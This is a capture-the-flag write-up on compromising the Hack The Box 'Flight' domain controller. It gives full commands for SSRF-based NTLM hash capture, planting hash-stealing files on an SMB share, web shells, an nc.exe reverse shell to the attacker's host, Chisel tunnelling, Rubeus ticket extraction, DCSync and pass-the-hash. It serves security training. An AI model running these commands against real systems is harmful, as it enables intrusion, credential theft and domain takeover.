<link rel="stylesheet" href="{{ '/assets/css/obsidian-dividers.css' | relative_url }}">

## Summary

<div class="divider divider-info">
    <span class="divider-title">TL;DR</span>
    <span class="divider-content">Flight is a Hard Windows Domain Controller that demonstrates advanced Active Directory exploitation. The attack chain begins with virtual host enumeration leading to SSRF exploitation for NTLM credential leakage. After password spraying and gaining write access to SMB shares, desktop.ini files are weaponized to steal additional credentials. Multiple web shells (PHP and ASPX) provide progressive privilege escalation, ultimately revealing IIS running under a Virtual Account with Domain Controller machine account privileges. This misconfiguration allows TGT extraction via Rubeus and a DCSync attack to compromise the entire domain.</span>
</div>

**Key Vulnerabilities:**
- SSRF vulnerability allowing NTLM credential capture via UNC path injection
- Misconfigured SMB share permissions enabling NTLM theft attacks
- IIS Virtual Account running with Domain Controller machine account privileges
- Ability to extract machine account TGT for DCSync attack

---

## Enumeration

### Nmap Scan

**Initial scan:**
```bash
nmap -sC -sV -p- flight.htb -oN nmap_full.txt
```

**Results:**

| Port      | Service               | Version                  |
| --------- | --------------------- | ------------------------ |
| 53        | DNS                   | Simple DNS Plus          |
| 80        | HTTP                  | Apache httpd 2.4.52      |
| 88        | Kerberos              | Microsoft Windows        |
| 135       | MSRPC                 | Microsoft Windows RPC    |
| 139       | NetBIOS-SSN           | Microsoft Windows        |
| 389       | LDAP                  | Microsoft Windows AD     |
| 445       | SMB                   | Microsoft Windows Server |
| 464       | kpasswd5              | Microsoft Windows        |
| 593       | MSRPC over HTTP       | Microsoft Windows RPC    |
| 636       | LDAPS                 | Microsoft Windows AD     |
| 3268-3269 | Global Catalog        | Microsoft Windows AD     |
| 5985      | WinRM                 | Microsoft HTTPAPI 2.0    |
| 9389      | AD Web Services       | Microsoft Windows        |

**Key findings:**
- Target is a Windows Domain Controller (DC)
- Apache HTTP server running on port 80 (unusual for DC)
- Standard AD services (LDAP, Kerberos, SMB) available
- WinRM enabled for remote management

---

### Initial Enumeration

Standard enumeration attempts against LDAP, SMB, and RPC with null authentication yielded no results:

```bash
# SMB null session
nxc smb flight.htb -u '' -p '' --shares

# LDAP anonymous bind
ldapsearch -x -H ldap://flight.htb -b "dc=flight,dc=htb"

# RPC null session
rpcclient -U "" flight.htb
```

All standard enumeration vectors were locked down, so focus shifted to the HTTP service.

---

### Virtual Host Discovery

Even though the HTTP server at `flight.htb` didn't redirect to any domain name, virtual host enumeration was attempted:

```bash
ffuf -u http://flight.htb -H "Host: FUZZ.flight.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 7069
```

![[Pasted image 20251021170110.png]]

**Discovery:** Found virtual host `school.flight.htb`

Added to `/etc/hosts`:
```bash
echo "10.129.95.212 flight.htb school.flight.htb" | sudo tee -a /etc/hosts
```

---

## Initial Access

### SSRF Vulnerability Discovery

Exploring `school.flight.htb` revealed a web application with a parameter vulnerable to Server-Side Request Forgery (SSRF).

<div class="divider divider-warning">
    <span class="divider-title">SSRF to NTLM Leak</span>
    <span class="divider-content">SSRF vulnerabilities in Windows environments can be leveraged to force the server to authenticate to attacker-controlled resources using NTLM. By injecting UNC paths pointing to a malicious SMB server, the application makes an authentication attempt, leaking the NTLMv2 hash which can then be cracked offline.</span>
</div>

![[Pasted image 20251021170146.png]]

### Exploitation

**Step 1:** Start Responder to capture NTLM authentication
```bash
responder -I tun0
```

![[Pasted image 20251021170205.png]]

**Step 2:** Trigger SSRF with UNC path injection
```bash
curl "http://school.flight.htb/vulnerable_param?file=\\\\10.10.14.5\\share"
```

![[Pasted image 20251021170221.png]]

**Step 3:** Crack captured NTLMv2 hash
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20251021170233.png]]

<div class="divider divider-root">
    <span class="divider-title">Credentials Obtained</span>
    <span class="divider-content">svc_apache:S@Ss!K@*t13</span>
</div>

---

## Lateral Movement

### SMB Share Enumeration

With valid credentials, SMB shares were enumerated:

```bash
nxc smb flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --shares
```

![[Pasted image 20251021214113.png]]

**Available Shares:**

| Share       | Permissions | Description                                           |
| ----------- | ----------- | ----------------------------------------------------- |
| Shared      | READ, WRITE | Empty share with write access                         |
| Web         | READ, WRITE | Web root for `flight.htb` and `school.flight.htb`     |
| Users       | READ        | Standard `C:\\Users` directory                        |

---

### Password Spraying

Since `svc_apache` was likely created specifically to run the Apache service, the password might have been reused for other service accounts:

```bash
nxc smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
```

![[Pasted image 20251021214327.png]]

No additional accounts were found with this password, but `svc_apache` has valuable WRITE access to the `Shared` SMB share.

---

### NTLM Theft via Malicious Files

<div class="divider divider-info">
    <span class="divider-title">Desktop.ini NTLM Theft</span>
    <span class="divider-content">Windows automatically processes certain files (like desktop.ini, .url, .lnk) when a directory is accessed. By crafting these files with UNC paths to attacker-controlled servers, any user browsing the SMB share will automatically leak their NTLM hash without any interaction beyond opening the folder.</span>
</div>

With write access to the `Shared` folder and assuming other users access this share, malicious files can be planted to capture NTLM hashes.

**Step 1:** Generate malicious files using [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
```bash
python3 ntlm_theft.py -g all -s 10.10.14.5 -f shared_files
```

![[Pasted image 20251021205646.png]]

**Step 2:** Upload all files to the share
```bash
smbclient //flight.htb/Shared -U 'svc_apache%S@Ss!K@*t13'
smb: \> mput *
```

![[Pasted image 20251021214830.png]]

**Step 3:** Wait for automatic authentication (Responder still running)

![[Pasted image 20251021205703.png]]

**Step 4:** Crack the new hash
```bash
hashcat -m 5600 hash2.txt /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20251021214929.png]]

<div class="divider divider-root">
    <span class="divider-title">New Credentials</span>
    <span class="divider-content">c.bum:Tikkycoll_431012284</span>
</div>

---

## User Flag

**Retrieve user flag via SMB:**
```bash
smbclient //flight.htb/Users -U 'c.bum%Tikkycoll_431012284'
smb: \> cd c.bum\Desktop
smb: \> get user.txt
```

![[Pasted image 20251021215042.png]]

**User Flag:** `[REDACTED]`

---

## Privilege Escalation

### PHP Web Shell Deployment

The user `c.bum` has WRITE access to the `Web` share, which serves the Apache web root.

**Step 1:** Upload PHP web shell
```bash
smbclient //flight.htb/Web -U 'c.bum%Tikkycoll_431012284'
smb: \> put webshell.php
```

**Step 2:** Confirm execution
```bash
curl "http://flight.htb/webshell.php?cmd=whoami"
# Output: flight\svc_apache
```

**Step 3:** Create temporary directory and upload nc.exe
```bash
curl "http://flight.htb/webshell.php?cmd=mkdir%20C:\\temp"
curl "http://flight.htb/webshell.php?cmd=powershell%20-c%20Invoke-WebRequest%20-Uri%20http://10.10.14.5/nc.exe%20-OutFile%20C:\\temp\\nc.exe"
```

**Step 4:** Catch reverse shell
```bash
# On attacker
nc -lvnp 4444

# Trigger via webshell
curl "http://flight.htb/webshell.php?cmd=C:\\temp\\nc.exe%2010.10.14.5%204444%20-e%20cmd.exe"
```

---

### Internal Service Discovery

With an interactive shell, further enumeration revealed an IIS service on localhost:8000:

```powershell
netstat -ano | findstr LISTEN
# Output shows: 127.0.0.1:8000

curl http://localhost:8000
# Response confirms IIS server

dir C:\inetpub\development
# Web root for the IIS service
```

The IIS service is not externally accessible, requiring port forwarding or tunneling.

---

### Port Forwarding with Chisel

**Step 1:** Start Chisel server on attacker machine
```bash
./chisel server -p 9999 --reverse
```

**Step 2:** Upload and run Chisel client on target
```powershell
# Via webshell
curl "http://flight.htb/webshell.php?cmd=powershell%20-c%20Invoke-WebRequest%20-Uri%20http://10.10.14.5/chisel.exe%20-OutFile%20C:\\temp\\chisel.exe"

# Via reverse shell
C:\temp\chisel.exe client 10.10.14.5:9999 R:socks
```

**Step 3:** Configure proxychains to access localhost:8000 through SOCKS proxy

---

### ASPX Web Shell for Higher Privileges

Attempting to upload an ASPX web shell as `svc_apache` failed due to insufficient permissions. However, `c.bum` is a member of the `WebDevs` group, suggesting proper permissions.

**Step 1:** Upload RunasCs.exe for privilege delegation
```powershell
curl "http://flight.htb/webshell.php?cmd=powershell%20-c%20Invoke-WebRequest%20-Uri%20http://10.10.14.5/RunasCs.exe%20-OutFile%20C:\\temp\\RunasCs.exe"
```

**Step 2:** Upload ASPX web shell as c.bum
```powershell
C:\temp\RunasCs.exe c.bum "Tikkycoll_431012284" "powershell -c \"Invoke-WebRequest -Uri http://10.10.14.5/webshell.aspx -OutFile C:\inetpub\development\webshell.aspx\""
```

![[Pasted image 20251021211722.png]]

**Step 3:** Verify upload

![[Pasted image 20251021211736.png]]

**Step 4:** Access ASPX shell via SOCKS proxy at `http://localhost:8000/webshell.aspx` and obtain reverse shell

---

### Virtual Accounts - Critical Discovery

Running `whoami` from the new ASPX shell returned:

```
iis apppool\defaultapppool
```

![[Pasted image 20251021215959.png]]

<div class="divider divider-warning">
    <span class="divider-title">IIS Virtual Accounts</span>
    <span class="divider-content">Virtual Accounts are a special type of local account introduced in Windows Server 2008 R2 for running services. Unlike traditional service accounts, Virtual Accounts do not have passwords or credentials of their own. Instead, when they access network resources, they authenticate using the machine account credentials (COMPUTERNAME$). Since this IIS service is running on the Domain Controller, it authenticates over the network as the DC machine account (G0$), which has full Domain Admin privileges.</span>
</div>

![[Pasted image 20251021220105.png]]

This configuration means the IIS application pool has implicit Domain Controller machine account privileges for network authentication.

---

### TGT Extraction with Rubeus

Using [Rubeus](https://github.com/GhostPack/Rubeus), a TGT (Ticket Granting Ticket) can be extracted for the DC machine account:

**Step 1:** Upload Rubeus.exe
```powershell
powershell -c "Invoke-WebRequest -Uri http://10.10.14.5/Rubeus.exe -OutFile C:\temp\Rubeus.exe"
```

**Step 2:** Extract TGT
```powershell
C:\temp\Rubeus.exe tgtdeleg /nowrap
```

![[Pasted image 20251021220313.png]]

The output is a base64-encoded `.kirbi` Kerberos ticket:

![[Pasted image 20251021220329.png]]

**Step 3:** Convert ticket format
```bash
# Save base64 output to file
echo "[BASE64_BLOB]" > ticket.b64

# Decode base64
cat ticket.b64 | base64 -d > ticket.kirbi

# Convert to ccache format
impacket-ticketConverter ticket.kirbi ticket.ccache

# Set for Kerberos authentication
export KRB5CCNAME=ticket.ccache
```

![[Pasted image 20251021220506.png]]

---

### DCSync Attack

<div class="divider divider-info">
    <span class="divider-title">DCSync Attack</span>
    <span class="divider-content">DCSync is a technique that leverages the Directory Replication Service (DRS) protocol to impersonate a Domain Controller and request password data from another DC. With the machine account TGT, we can perform this replication request to extract any user's credentials, including the Domain Administrator.</span>
</div>

With the TGT for the DC machine account, perform DCSync to extract Administrator's NTLM hash:

```bash
impacket-secretsdump g0.flight.htb -k -just-dc-user Administrator -no-pass
```

![[Pasted image 20251021220644.png]]

**Administrator NTLM Hash:** `[REDACTED]`

---

## Root Flag

Using the Administrator hash for Pass-the-Hash authentication:

```bash
impacket-psexec Administrator@g0.flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:[ADMIN_HASH]
```

![[Pasted image 20251021220744.png]]

<div class="divider divider-root">
    <span class="divider-title">Domain Compromised</span>
    <span class="divider-content">Successfully obtained NT AUTHORITY\SYSTEM access</span>
</div>

**Root Flag:** `[REDACTED]`

---

## Post-Exploitation

**Attack Chain Summary:**
1. Virtual host enumeration → SSRF vulnerability discovery
2. NTLM credential capture via UNC path injection
3. SMB share write access → desktop.ini NTLM theft
4. PHP web shell → reverse shell as svc_apache
5. Internal port forwarding to access IIS on localhost:8000
6. ASPX web shell as c.bum → execution as IIS Virtual Account
7. TGT extraction from Virtual Account (running as DC machine account)
8. DCSync attack → Administrator NTLM hash
9. Pass-the-Hash → Domain compromise

**Key Lessons:**
- Always enumerate virtual hosts even without domain redirects
- SSRF vulnerabilities in Windows can leak NTLM hashes via UNC paths
- SMB write access enables passive NTLM theft with desktop.ini
- Understanding Windows service account types (Virtual Accounts) is critical
- Services running as Virtual Accounts authenticate with machine credentials
- Machine accounts on Domain Controllers have full domain privileges
- TGTs for machine accounts enable powerful attacks like DCSync

---

## References

- [NTLM Theft Tool - GitHub](https://github.com/Greenwolf/ntlm_theft)
- [RunasCs - GitHub](https://github.com/antonioCoco/RunasCs)
- [Rubeus - GitHub](https://github.com/GhostPack/Rubeus)
- [Virtual Accounts - Microsoft Docs](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/service-accounts)
- [DCSync Attack - MITRE ATT&CK](https://attack.mitre.org/techniques/T1003/006/)
- [Chisel - GitHub](https://github.com/jpillora/chisel)
- [AS-REP Roasting - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)

---

## Timeline

```mermaid
graph LR
    A[Nmap Scan] --> B[VHost Discovery]
    B --> C[SSRF Exploitation]
    C --> D[NTLM Hash Capture]
    D --> E[SMB Enumeration]
    E --> F[Desktop.ini NTLM Theft]
    F --> G[PHP Web Shell]
    G --> H[Port Forwarding]
    H --> I[ASPX Web Shell]
    I --> J[Virtual Account Discovery]
    J --> K[Rubeus TGT Extraction]
    K --> L[DCSync Attack]
    L --> M[Domain Admin]
```



---

**Pwned on:** 21/10/2025

**Difficulty Rating:** ⭐⭐⭐⭐⭐ (Excellent learning experience)  
**Fun Factor:** ⭐⭐⭐⭐ (Challenging and unique privilege escalation)
